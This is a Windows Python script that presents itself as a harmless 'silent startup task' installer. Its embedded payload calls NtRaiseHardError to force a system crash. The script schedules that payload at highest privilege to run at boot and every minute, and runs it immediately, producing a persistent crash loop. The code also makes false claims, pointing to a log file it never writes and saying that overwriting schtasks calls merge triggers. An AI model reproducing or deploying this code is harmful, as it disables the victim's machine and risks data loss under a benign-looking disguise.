import os
import sys
import subprocess
from textwrap import dedent

# === CONFIGURATION ===
# Name of the scheduled task
TASK_NAME = "MySilentPythonTask"

# Folder where the target script will be stored
TARGET_DIR = os.path.join(os.environ["ProgramData"], "PythonStartupTasks")
os.makedirs(TARGET_DIR, exist_ok=True)

# Name of the script that will be created and scheduled
SCRIPT_NAME = "my_script.py"
TARGET_SCRIPT = os.path.join(TARGET_DIR, SCRIPT_NAME)

# Delay after startup (seconds)
DELAY_SECONDS = 15

# === The code to write into your startup Python script ===
# Replace this block with any Python code you want to run at startup.
SCRIPT_CODE = dedent("""\
    from ctypes import windll
    from ctypes import c_int
    from ctypes import c_uint
    from ctypes import c_ulong
    from ctypes import POINTER
    from ctypes import byref

    nullptr = POINTER(c_int)()

    windll.ntdll.RtlAdjustPrivilege(
        c_uint(19), 
        c_uint(1), 
        c_uint(0), 
        byref(c_int())
    )

    windll.ntdll.NtRaiseHardError(
        c_ulong(0xC000007B), 
        c_ulong(0), 
        nullptr, 
        nullptr, 
        c_uint(6), 
        byref(c_uint())
    )
""")

# === Write the target script ===
with open(TARGET_SCRIPT, "w", encoding="utf-8") as f:
    f.write(SCRIPT_CODE)

print(f"✅ Created startup script at:\n  {TARGET_SCRIPT}")

# === Determine pythonw path ===
pythonw = os.path.join(os.path.dirname(sys.executable), "pythonw.exe")
if not os.path.exists(pythonw):
    print("⚠️ Could not find pythonw.exe; falling back to python.exe (console may appear).")
    pythonw = sys.executable

# === Build schtasks command ===
# === Create both triggers ===
# 1️⃣ At startup (delayed)
startup_trigger = [
    "/Create", "/TN", TASK_NAME,
    "/TR", f'"{pythonw}" "{TARGET_SCRIPT}"',
    "/SC", "ONSTART",
    "/RL", "HIGHEST",
    "/F"
]
if DELAY_SECONDS > 0:
    startup_trigger.extend(["/DELAY", f"0000:{DELAY_SECONDS:02d}"])

# 2️⃣ Every minute (daily schedule)
minute_trigger = [
    "/Create", "/TN", TASK_NAME,
    "/TR", f'"{pythonw}" "{TARGET_SCRIPT}"',
    "/SC", "MINUTE",
    "/MO", "1",
    "/RL", "HIGHEST",
    "/F"
]

print("📅 Creating scheduled tasks...")

try:
    # Create the first trigger
    subprocess.run(["schtasks"] + startup_trigger, check=True)
    # Add the second trigger (the same task name merges triggers)
    subprocess.run(["schtasks"] + minute_trigger, check=True)
    print(f"✅ Scheduled task '{TASK_NAME}' created/updated successfully.")
    print("→ Runs once at startup (after delay) and then every minute.")
except subprocess.CalledProcessError as e:
    print("❌ Failed to create or update task. Run this script as Administrator.")
    print("Error:", e)

# === STEP 5: Run it immediately ===
print("🚀 Running the script now for immediate test...")
try:
    subprocess.Popen([pythonw, TARGET_SCRIPT], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print("✅ Script launched. Check C:\\Temp\\startup_log.txt to confirm execution.")
except Exception as e:
    print("❌ Failed to run the script immediately:", e)